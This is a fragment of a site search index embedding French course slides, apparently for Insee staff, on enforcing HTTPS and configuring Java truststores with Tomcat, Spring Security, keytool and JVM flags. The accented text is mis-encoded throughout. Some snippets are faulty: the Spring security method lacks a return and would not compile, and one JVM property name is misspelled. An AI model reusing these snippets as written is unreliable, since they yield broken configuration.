imposÃ©e par l\u0026rsquo;application\nCe connecteur existe dÃ©jÃ  par dÃ©faut, il faut uniquement changer le port de redirection si nÃ©cessaire\n\u0026lt;Connector connectionTimeout=\u0026quot;20000\u0026quot; port=\u0026quot;8080\u0026quot; protocol=\u0026quot;HTTP/1.1\u0026quot; redirectPort=\u0026quot;8443\u0026quot;/\u0026gt;  Rendre le https obligatoire # web.xml (Tomcat)\n\u0026lt;security-constraint\u0026gt; \u0026lt;display-name\u0026gt;tout-en-https\u0026lt;/display-name\u0026gt; \u0026lt;web-resource-collection\u0026gt; \u0026lt;web-resource-name\u0026gt;tout\u0026lt;/web-resource-name\u0026gt; \u0026lt;url-pattern\u0026gt;/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/web-resource-collection\u0026gt; \u0026lt;user-data-constraint\u0026gt; \u0026lt;transport-guarantee\u0026gt;CONFIDENTIAL\u0026lt;/transport-guarantee\u0026gt; \u0026lt;/user-data-constraint\u0026gt; \u0026lt;/security-constraint\u0026gt;  Spring Security\n@Configuration @EnableWebSecurity public class MySecurityConfiguration { @Bean public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception { http.requiresChannel().anyRequest().requiresSecure(); } }  TP #  GÃ©nÃ©rer un keystore pour une configuration https de localhost Mettre en place https sur un serveur local Forcer le https sur l\u0026rsquo;application   Vraiment forcer le HTTPS #  Niveau applicatif pour controle Ã©ventuellement Niveau Frontal (Load Balancer) : Ã©couter en http sur le port 80 mais uniquement pour rediriger vers https DÃ©claratif Indiquer au navigateur de ne plsu utiliser que HTTPS : en-tÃªte HSTS  Strict-Transport-Security \u0026quot;max-age=31536000\u0026quot;   Le truststore #  Mon application doit se connecter Ã  une autre application (web-service) Je souhaite que cet appel soit en https (au fond justifiÃ© que si la connexion entre les deux serveurs passent par Internet) Lors d\u0026rsquo;une connexion HTTPS, Java vÃ©rifie si le certificat distant est valide C\u0026rsquo;est ce que fait le navigateur quand on se connecte Ã  un site Si le certificat n\u0026rsquo;est pas valide (expirÃ©, non associÃ© au domaine, non signÃ© par une autoritÃ© de confiance), le navigateur me le signale et je choisit de prendre le risque ou non de me connecter au site. Dans l\u0026rsquo;appli, Java refusera systÃ©matiquement la connexion   Le truststore #  Date d\u0026rsquo;expiration, mauvais nom : je ne peux rien faire, il faut que le certificat soit cohÃ©rent AutosignÃ© ? Je peux dire Ã  Java que le signataire du certificat est valide, en d\u0026rsquo;autres termes, je lui dÃ©finis une autoritÃ© de confiance (Il existe la possibilitÃ© de crÃ©er une classe faisant que Java ne fait plus aucun contrÃ´le sur le certificat mais c\u0026rsquo;est mal) Il faut crÃ©er un truststore contenant l\u0026rsquo;ensemble des certificats Ã  valider (= ce que l\u0026rsquo;on considÃ¨re AC)   Le truststore #  Par dÃ©faut le trustore chargÃ© est celui de la jvm Ã©xÃ©cutant l\u0026rsquo;application (\u0026hellip;.\\mon-jdk\\lib\\security\\cacerts) Le mot de passe par dÃ©faut est changeit On peut vouloir un \u0026ldquo;Insee flavored cacert\u0026rdquo; : le cacerts disponible dans la distribution java plus la chaine de certification Insee (AC Racine + AC SubordonnÃ©e) Au cas oÃ¹ : certificats AC Insee   Le truststore #  Pour le changer on utilise des paramÃ¨tres de la JVM :  javax.net.ssl.trustStrore javax.net.ssl.trustStorePassword javax.net.ssl.trustStoreType (par dÃ©faut jks)   On crÃ©e un nouveau truststore, en pratique on ajoute nos certificats au truststore par dÃ©faut   Le truststore #  CrÃ©er le truststore  keytool -import -trustcacerts -file server.crt -alias localhost -keystore cacertsperso  Si keytool inconnu : (Ã  ajouter au path pour plus de simplicitÃ©)\n\u0026quot;path/to/mon-jdk/bin/keytool.exe\u0026quot; \u0026quot;$JAVA_HOME/bin/keytool.exe\u0026quot;  CrÃ©e le truststore si cacertsperso n\u0026rsquo;existe pas encore, ajoute le certificat aux existants s\u0026rsquo;il existe dÃ©jÃ \n Le truststore #  Le dÃ©clarer au dÃ©marrage :  ParamÃ¨tres de dÃ©marrage    -Djavax.net.ssl.trustStore=\u0026quot;/path/to/cacerts.jks\u0026quot; -Djavax.net.ssl.trustStorePassword=changeit -Djavax.net.ssl.trustStoreType=JKS -Djavax.net.debug=all (UNIQUEMENT pour debugger en cas de problÃ¨me, c'est TRES verbeux)   Dans le code :  System.setProperty(\u0026quot;javax.net.ssl.trustStore\u0026quot;, \u0026quot;/path/to/cacerts.jks\u0026quot;); System.setProperty(\u0026quot;javax.net.ssl.trustStorePassword\u0026quot;, \u0026quot;changeit\u0026quot;); System.setProperty(\u0026quot;javax.net.ssl.trustStoreType\u0026quot;, \u0026quot;JKS\u0026quot;);   TP #  CrÃ©er un truststore incluant le cacert Insee et le certificat gÃ©nÃ©rÃ© prÃ©cÃ©demment Le faire prendre en compte dans l\u0026rsquo;application   Https sur les application javascript #  Fonctionnement proche : rÃ©alisÃ© par le F5 en prod, par l\u0026rsquo;apache en dv/qf (mais il n\u0026rsquo;y a pas de tomcat) L\u0026rsquo;application s\u0026rsquo;Ã©xÃ©cute chez le client, pour forcer le https, il faut donc raisonner cÃ´tÃ© client Si l\u0026rsquo;application JS veut s\u0026rsquo;assurer de passer en HTTPS, elle doit vÃ©rifier le window.location du client et Ã©ventuellement le rediriger.   Https sur les application javascript # if ( typeof window !== 'undefined' \u0026amp;\u0026amp; window.location \u0026amp;\u0026amp; window.location.protocol === 'http:' ) { window.location.href = window.location.href.replace( /^http(?!s)/, 'https' ); }   Https sur les application javascript : dÃ©veloppement # Pour lancer une application \u0026ldquo;create-react-app\u0026rdquo; en https en local (par defaut http) :\n Au lieu de npm start Lancer set HTTPS=true\u0026amp;\u0026amp;npm start   Https sur les application javascript : cas du back-end mal signÃ© # Un front-end JavaScript effectue des appels Ã  son backend.\nDans la pratique, c\u0026rsquo;est le navigateur qui effectue ces requetes, et si le certificat du backend ne convient pas au navigateur, la requete va Ãªtre rejetÃ©e.\n Solution 1 : Faire en sort que le backend ait un certificat signÃ© par l\u0026rsquo;Insee Solution 2 : se connecter manuellement une fois au backend, accepter l\u0026rsquo;alerte de sÃ©curitÃ© du navigateur  "}).add({id:11,href:"/docs/",title:"Docs",description:"",content:""}),search.addEventListener("input",t,!0);function t(){const s=5;var n=this.value,o=e.search(n,{limit:s,enrich:!0});const t=new Map;for(const e of o.flatMap(e=>e.result)){if(t.has(e.doc.href))continue;t.set(e.doc.href,e.doc)}if(suggestions.innerHTML="",suggestions.classList.remove("d-none"),t.size===0&&n){const e=document.createElement("div");e.innerHTML=`No results for "<strong>${n}</strong>"`,e.classList.add("suggestion__no-results"),suggestions.appendChild(e);return}for(const[r,a]of t){const n=document.createElement("div");suggestions.appendChild(n);const e=document.createElement("a");e.href=r,n.appendChild(e);const o=document.createElement("span");o.textContent=a.title,o.classList.add("suggestion__title"),e.appendChild(o);const i=document.createElement("span");if(i.textContent=a.description,i.classList.add("suggestion__description"),e.appendChild(i),suggestions.appendChild(n),suggestions.childElementCount==s)break}}})()